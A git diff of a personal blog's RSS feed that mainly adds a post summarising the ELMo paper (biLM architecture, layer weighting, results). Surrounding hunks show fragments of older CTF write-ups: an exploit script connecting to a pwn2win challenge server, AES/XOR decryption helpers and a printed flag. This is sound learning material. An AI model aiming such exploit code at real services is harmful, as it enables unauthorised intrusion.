@@ -5,12 +5,387 @@
     <link>https://shreyansh26.github.io/</link>
       <atom:link href="https://shreyansh26.github.io/index.xml" rel="self" type="application/rss+xml" />
     <description>Shreyansh Singh</description>
-    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2021</copyright><lastBuildDate>Sun, 18 Apr 2021 16:57:49 +0530</lastBuildDate>
+    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>© Shreyansh Singh 2021</copyright><lastBuildDate>Sun, 25 Apr 2021 15:13:13 +0530</lastBuildDate>
     <image>
       <url>https://shreyansh26.github.io/img/Shreyansh.jpg</url>
       <title>Shreyansh Singh</title>
       <link>https://shreyansh26.github.io/</link>
     </image>
+    
+    <item>
+      <title>Paper Notes #2 - Deep contextualized word representations</title>
+      <link>https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/</link>
+      <pubDate>Sun, 25 Apr 2021 15:13:13 +0530</pubDate>
+      <guid>https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/</guid>
+      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: Deep contextualized word representations&lt;br&gt;
+&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://arxiv.org/abs/1802.05365&#34;&gt;https://arxiv.org/abs/1802.05365&lt;/a&gt; &lt;br&gt;
+&lt;strong&gt;Authors&lt;/strong&gt;: Matthew E. Peters, Mark Neumann, Mohit Iyyer, Matt Gardner, Christopher Clark, Kenton Lee, Luke Zettlemoyer&lt;br&gt;
+&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/allenai/allennlp/blob/main/allennlp/modules/elmo.py&#34;&gt;https://bit.ly/3xpHNAI&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; - Since this is a relatively old paper, all the performance comparisons and state-of-the-art claims mentioned below should only be considered for the models at the time the paper was published.&lt;/p&gt;
+&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
+&lt;p&gt;The paper proposes a new type of deep contextualized word representation that helps to effectively capture the syntactic and semantic characteristics of the word along with the linguistic context of the word. It can help differentiate the same word being used in different contexts with different meanings. The representations (embeddings) are learned from the internal states of a deep bidirectional language model (biLM). The embeddings, when used with the existing models, significantly improved the state of the art in six NLP problems - Question Answering, Natural Language Inference, Semantic Role Labeling, Coreference Resolution, Named Entity Recognition and Sentiment Analysis.&lt;/p&gt;
+&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
+&lt;p&gt;The existing word representations commonly in use were Word2Vec and GloVe. However, there was a need to capture even richer word representations. The paper states that the two main requirements of a good representation should be that they should be able to capture the complex characteristics of the word use and at the same time capture polysemy as well. This is the idea behind using ELMo (Embeddings from Language Models) representations.&lt;/p&gt;
+&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
+&lt;p&gt;As a high-level overview, it can be said that the ELMo representations are a function of the entire input sequence. A two-layer biLM model with character-level convolutions is trained on a text corpus. The ELMo word representations are computed as a linear function of the internal network states of the biLM. The biLM is pretrained on a large scale and the ELMo representations can be incorporated into several deep learning-based NLP architectures.&lt;/p&gt;
+&lt;h3 id=&#34;bilm-bidirectional-language-model&#34;&gt;biLM (Bidirectional Language Model)&lt;/h3&gt;
+&lt;p&gt;A forward language model computes the probability of the sequence by modelling the probability of a token t&lt;sub&gt;k&lt;/sub&gt; given the history (t&lt;sub&gt;1&lt;/sub&gt;, &amp;hellip;, t&lt;sub&gt;k-1&lt;/sub&gt;). Similarly, a backward language model predicts the previous token given the nature context i.e., it performs the same function but in reverse order.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/forwardlm.PNG&#34; data-caption=&#34;Forward LM probability modelling&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/forwardlm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    Forward LM probability modelling
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/backwardlm.PNG&#34; data-caption=&#34;Backward LM probability modelling&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/backwardlm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    Backward LM probability modelling
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;In a forward LM, a context-independent token representation x&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;LM&lt;/sup&gt; is obtained from a character-level CNN and then passed through &lt;em&gt;L&lt;/em&gt; layers of LSTMs. At each position &lt;em&gt;k&lt;/em&gt;, the LSTM layer outputs a context-dependent representation h&lt;sub&gt;&lt;i&gt;k,j&lt;/i&gt;&lt;/sub&gt;&lt;sup&gt;LM&lt;/sup&gt;, where &lt;em&gt;j&lt;/em&gt; = 1, &amp;hellip;, &lt;em&gt;L&lt;/em&gt;. the top layer of the LSTM output is used to predict the next token t&lt;sub&gt;k+1&lt;/sub&gt; with a Softmax layer. The same procedure is applied to the backward LM as well.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/bilm.PNG&#34; data-caption=&#34;biLM probability modelling&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/bilm.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    biLM probability modelling
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;A biLM combines both the forward and backward LM. The above formulation jointly optimizes the log-likelihood of the forward and backward directions.&lt;/p&gt;
+&lt;p&gt;The formulation ties both the token representation Θ&lt;sub&gt;x&lt;sub&gt; and the Softmax layer Θ&lt;sub&gt;s&lt;/sub&gt; Separate paremeters are maintained for the forward and backward LSTMs.&lt;/p&gt;
+&lt;p&gt;Next, we look at getting the word representations using ELMo.&lt;/p&gt;
+&lt;h3 id=&#34;elmo&#34;&gt;ELMo&lt;/h3&gt;
+&lt;p&gt;ELMo is a task-specific combination of the intermediate layer representations of the biLM model. If we have &lt;em&gt;L&lt;/em&gt; LSTM layers, then for each token t&lt;sub&gt;k&lt;/sub&gt; we have 2L + 1 representations.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmorepr.PNG&#34; &gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmorepr.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;Now to get one single vector for each token, all the representations in &lt;em&gt;R&lt;/em&gt; are merged to one. Usually, task-specific weighting is performed.&lt;/p&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmoeq.PNG&#34; &gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/elmoeq.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;The &lt;i&gt;s&lt;/i&gt;&lt;sup&gt;&lt;i&gt;task&lt;/i&gt;&lt;/sup&gt; are softmax normalized weights and the scale parameter γ&lt;sup&gt;&lt;i&gt;task&lt;/i&gt;&lt;/sup&gt; allows te task model to scale the entire ELMo vector. In spme cases, applying LayerNorm to each biLM layer before weighting also helped.&lt;/p&gt;
+&lt;h3 id=&#34;using-elmo-for-supervised-nlp-tasks&#34;&gt;Using ELMo for supervised NLP tasks&lt;/h3&gt;
+&lt;p&gt;We start with a pretrained biLM model, The biLM is run to record the layer representations for each word. When using any supervised deep learning MLP model have a common architecture for the lowest layers. They usually use a context-independent token representation x&lt;sub&gt;k&lt;/sub&gt; for each token position using pre-trained embeddings and optionally also using character-based representations. Then, in the higher layers, the model forms context-sensitive representations using RNNs, CNNs or whatever, as per the task and the model.
+For using ELMo, we can start in the same manner. We obtain the embeddings from the freezed weights of the biLM. Now instead of passing just x&lt;sub&gt;k&lt;/sub&gt; to the above layers, we will pass &lt;/br&gt; [x&lt;sub&gt;k&lt;/sub&gt;; &lt;strong&gt;ELMo&lt;/strong&gt;&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;task&lt;/sup&gt; ] into the task model layers. For some tasks like SNLI (Natural language Inference) and SQuAD (Question-Answering), it was also seen that including ELMo at the output of the task model by introducing another set of output specific linear weights and replacing h&lt;sub&gt;k&lt;/sub&gt; with [h&lt;sub&gt;k&lt;/sub&gt;; &lt;strong&gt;ELMo&lt;/strong&gt;&lt;sub&gt;k&lt;/sub&gt;&lt;sup&gt;task&lt;/sup&gt; ] led to an improvement.&lt;/p&gt;
+&lt;p&gt;Additionally, in some cases, regularizing the ELMo weights with λ||&lt;strong&gt;w&lt;/strong&gt;||&lt;sub&gt;2&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; helped introduce an inductive bias on the ELMo weights to make it stay close to the average of all biLM layers.&lt;/p&gt;
+&lt;h3 id=&#34;pre-trained-bidirectional-language-model-architecture&#34;&gt;Pre-trained bidirectional language model architecture&lt;/h3&gt;
+&lt;p&gt;The pre-trained biLM used in the paper is similar to the architecture in &lt;a href=&#34;https://arxiv.org/abs/1602.02410&#34;&gt;Józefowicz et al.&lt;/a&gt;. It is modified to support joint training of both directions and a residual connection is added between the LSTM layers. The size of the embeddings and layers were from what was in the &lt;code&gt;CNN-BIG-LSTM&lt;/code&gt; architecture in &lt;a href=&#34;https://arxiv.org/abs/1602.02410&#34;&gt;Józefowicz et al.&lt;/a&gt;. The final model has &lt;em&gt;L&lt;/em&gt;=2 biLSTM layers with 4096 units and 512-dimensional embeddings and a residual connection from the first to the second layer. The context insensitive type representation uses 2048 character n-gram convolutional filters followed by two highway layers and a linear projection down to a 512 representation. As a result, the biLM provides three layers of representations for each input token, including those outside the training set due to the purely
+character input.&lt;/p&gt;
+&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/results.PNG&#34; data-caption=&#34;Results comparison of the baseline models with the ones used along with ELMo&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/results.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    Results comparison of the baseline models with the ones used along with ELMo
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;p&gt;The details of the baseline models are given in the paper. In all the tasks, the use of the ELMo representations led to improvement in the state-of-the-art results.&lt;/p&gt;
+&lt;p&gt;Key points from the analysis section -&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Regularization parameter λ is important. λ=1 means that we are effectively reducing the weighting function to a simple average over the layers, while smaller values like λ=0.001 allows the layer weights to vary.&lt;/li&gt;
+&lt;li&gt;The fact that we take the representations from all the layers gives a better performance as compared to just taking the topmost layer. Taking just the last layer is still better than the baseline.&lt;/li&gt;
+&lt;li&gt;A small λ is preferred in most cases with ELMo, although for NER, a task with a smaller training set, the results are insensitive to λ.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layercomp.PNG&#34; data-caption=&#34;Baseline vs ELMo last layer vs All the layers&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layercomp.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    Baseline vs ELMo last layer vs All the layers
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Including ELMo at both the input and output layers for SNLI and SQuAD improves over just the input layer. This is because SNLI and SQuAD use an attention layer after the biRNN and using ELMo at the output layer would allow the model to attend directly to the internal representations of the biLM. But for SRL (and coreference resolution) performance is highest when it is included at just the input layer. Probably because the task-specific context representations are more important than those from the biLM.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layerloc.PNG&#34; &gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/layerloc.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+
+&lt;/figure&gt;
+
+&lt;ul&gt;
+&lt;li&gt;The higher-level LSTM states of the biLM capture context-dependent aspects of word meaning (e.g., they can be used without modification to perform well on supervised word sense disambiguation tasks) while lower-level states model aspects of syntax (e.g., they can be used to do part-of-speech tagging).&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/contextcapture.PNG&#34; data-caption=&#34;biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/contextcapture.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Different layers in the biLM represent different types of information and explains why including all biLM layers are important for the highest performance in downstream
+tasks.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Using ELMo with a model also improves the sample efficiency. The model now requires a fewer number of epochs (parameter updates) and less amount of training data as well. For eg., the baseline SRL model requires 486 epochs to reach the maximum F1 score. The model with the ELMo representations only requires 10 epochs to exceed the baseline. In addition, ELMo-enhanced models use smaller training sets more efficiently than models without ELMo. Again, if we consider the SRL case, the ELMo model with 1% of the training set has about the same F1 as the baseline model with 10% of the training set.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+&lt;figure&gt;
+
+
+  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/sampleeff.PNG&#34; data-caption=&#34;biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences&#34;&gt;
+&lt;img src=&#34;https://shreyansh26.github.io/post/2021-04-25_deep_contextualized_word_representations_elmo/images/sampleeff.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;
+
+
+  
+  
+  &lt;figcaption&gt;
+    biLM captures the context of the word &amp;lsquo;play&amp;rsquo; effectively from the source sentences
+  &lt;/figcaption&gt;
+
+
+&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/ELMo.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;This is all for now!&lt;/p&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
+&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
+&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
+&lt;style&gt;
+    .example_a {
+        color: #fff !important;
+        text-transform: uppercase;
+        text-decoration: none;
+        background: #3f51b5;
+        padding: 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        display: inline-block;
+        border: none;
+        transition: all 0.4s ease 0s;
+    }
+
+    .example_a:hover {
+        background: #434343;
+        letter-spacing: 1px;
+        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
+        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
+        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
+        transition: all 0.4s ease 0s;
+    }
+&lt;/style&gt;
+&lt;script type=&#34;text/javascript&#34;&gt;
+
+function showMailingPopUp() {
+    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })
+
+    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
+}
+
+document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};
+
+&lt;/script&gt;
+&lt;p&gt; &lt;/p&gt;
+&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Paper Notes #1 - Attention Is All You Need</title>
@@ -701,7 +1076,7 @@ document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPo
 &lt;p&gt;Here, we define the name of our app.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FastAPI(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Iris Classifier API&amp;#34;&lt;/span&gt;, description&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;API for Iris classification using ML&amp;#34;&lt;/span&gt;, version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next, we set up logging for our API as well, to ensure we can see WHEN something went wrong, in case something does go wrong.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Initialize logging&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Initialize logging&lt;/span&gt;
 my_logger &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getLogger()
 my_logger&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setLevel(logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DEBUG)
 logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;basicConfig(level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DEBUG, filename&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;logs.log&amp;#39;&lt;/span&gt;)
@@ -923,7 +1298,7 @@ key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(to_blocks(flag
     aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
     curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iv
     &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; block &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; blocks:
-        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
+        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
         curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(ctxt[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;bs:], block)
     &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ctxt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The complete exploit code is shown below -&lt;/p&gt;
@@ -932,7 +1307,7 @@ key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(to_blocks(flag
 &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES
 
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;encryption.pwn2.win&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;)
-&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;
 
 BUFF &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
 BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
@@ -963,7 +1338,7 @@ iv2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
     aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
     curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iv
     &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; block &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; blocks:
-        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
+        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
         curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(ctxt[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;bs:], block)
     &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ctxt
 
@@ -1154,7 +1529,7 @@ ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34
 	op1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]
 	op2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;]
 
-	&lt;span style=&#34;color:#75715e&#34;&gt;# print(&amp;#34;{}, {}, {}&amp;#34;.format(opcode, op1, op2))&lt;/span&gt;
+	&lt;span style=&#34;color:#75715e&#34;&gt;# print(&amp;#34;{}, {}, {}&amp;#34;.format(opcode, op1, op2))&lt;/span&gt;
 	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
 		data[op1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; op2
 	&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opcode &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
@@ -1577,7 +1952,7 @@ b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; b[::&lt;span style=&#
 
 
 &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
-&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#39;junior-alles_nur_kuchenblech_mafia!!&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#39;junior-alles_nur_kuchenblech_mafia!!&amp;#39;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The flag is - &lt;code&gt;junior-alles_nur_kuchenblech_mafia!!&lt;/code&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;p&gt;I had great fun solving this CTF. Learnt a ton! This was my last CTF and blog post for 2019.&lt;/p&gt;
@@ -1864,7 +2239,7 @@ document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPo
 )
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.&lt;/p&gt;
 &lt;p&gt;This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
